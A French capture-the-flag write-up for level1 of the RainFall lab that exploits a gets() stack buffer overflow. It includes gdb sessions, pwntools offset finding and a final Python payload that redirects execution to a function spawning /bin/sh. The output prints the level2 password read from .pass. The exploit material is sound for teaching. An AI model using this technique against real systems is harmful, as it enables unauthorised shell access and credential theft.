## Analyse de la version décompilée du binaire

On voit dans la version décompilée de l'executable `level1` du code qu'il existe une fonction run qui lance un shell

```C
int run()
{
  fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
  return system("/bin/sh");
}
```

On constate également que ce programme utilise la fonction gets() et, d'après la documentation, cette fonction possède un bug connu...

```
En C, la fonction gets() sert à lire une ligne depuis l’entrée standard (stdin) et à la stocker dans un tableau de caractères.

Comportement:
Lit des caractères depuis le clavier
S’arrête à un saut de ligne (\n)
N’écrit pas le \n dans la chaîne
Ajoute un caractère nul \0 à la fin
Retourne str en cas de succès, NULL en cas d’erreur

Vulnérabilité (très importante):
gets() ne vérifie absolument pas la taille du buffer.


Si l’utilisateur tape plus de caractères que la taille du tableau:
- dépassement de mémoire (buffer overflow),
- comportement indéfini,
- énorme faille de sécurité.
```

En synthèse le programme fait :

````C
#include <stdio.h>
#include <stdlib.h>

// Fonction cachée qui sera appelée si l'exécution est détournée (ret2libc / ROP / etc.)
void run(void) {
    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
    system("/bin/sh");   // Lance un shell
}

// Point d'entrée principal vulnérable
int main(int argc, char **argv) {
    char buffer[64];

    // Vulnérabilité : lecture sans limite, débordement de pile possible
    gets(buffer);

    return 0;
}
````

## Mise en place de l'exploit

On veut donc exploiter le buffer overflow pour manipuler le EIP et l'orienter vers la fonction run

### 1 - Adresse mémoire de run

D'abord identifions l'adresse mémoire de `run()`

```
level1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) 
```

On a donc l'adresse `0x08048444  run`

### 2 - Identification de l'offset

Pour trouver l'EIP on utilise la méthode de motifs cycliques qui constitue à :
- Envoyer un pattern unique (ex: 200 octets, sans répétition simple),
- Laisser le programme crasher,
- Regarder quelle valeur a écrasé EIP,
- Demander à l’outil : “cette sous‑chaîne apparaît à quel offset dans mon pattern ?”

On génère la chaine de la manière suivante :

````shell
(cons310_i2) ➜  level1 git:(main) ✗ python -c "from pwn import *; print(cyclic(200))"
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
````

Ensuite sur la VM on crée un fichier contenant la chaîne du pattern (sans le b'') :

````shell
level1@RainFall:~$ cat /tmp/pattern_200.txt 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
````

Ensuite on utilise ce pattern comme input du programme lors d'une analyse gdb pour obtenir la valeur à laquelle le programme a Segfault :

````
level1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) run < /tmp/pattern_200.txt
Starting program: /home/user/level1/level1 < /tmp/pattern_200.txt
Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
````

Le programme a donc segfault sur `0x61616174`, on peut utiliser la fonction cyclic_find() pour récupérer la valeur de l'offset : 

```shell
(cons310_i2) ➜  level1 git:(main) ✗ python -c "from pwn import *; print(cyclic_find(0x61616174))"
76
```

L'offset est donc de 76

### 3 - Exploit final

```shell
level1@RainFall:~$ (python -c "print '\x90' * 76 + '\x08\x04\x84\x44'[::-1]") | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Nous ajoutons l’adresse de run() à l’envers (c’est à cela que sert [::1], en Python c’est une opération d’inversion de chaîne) afin de respecter l’ordre des octets, après une liste de 76 instructions NOP.
Le segfault se produit toujours mais nous savons que nous sommes sur la bonne voie, car nous arrivons bien dans un shell. Cependant, comme il est exécuté via system() cette fois, il se termine quand la commande est finie. Demander simplement l’ouverture d’un shell ne suffit pas pour y rester. Nous devons utiliser quelque chose qui lit indéfiniment sur l’entrée standard, comme cat.

```shell
level1@RainFall:~$ (python -c "print '\x90' * 76 + '\x08\x04\x84\x44'[::-1]"; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```